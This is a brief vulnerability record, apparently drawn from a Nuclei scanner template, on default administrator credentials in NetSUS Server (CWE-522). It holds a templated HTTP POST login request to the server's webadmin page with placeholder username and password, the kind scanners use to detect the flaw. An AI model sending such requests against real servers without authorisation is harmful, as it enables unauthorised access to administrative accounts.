# Vulnerability: NetSUS Server Default Login
**Classification:** CWE-522
**Source:** Nuclei Template (`netsus-default-login.yaml`)

## Description
NetSUS Server default admin credentials were discovered.

## Vulnerable Code Pattern / Exploit Payload
```http
POST /webadmin/index.php HTTP/1.1
Host: {{Hostname}}
Content-Type: application/x-www-form-urlencoded

loginwith=suslogin&username={{username}}&password={{password}}&submit=
```

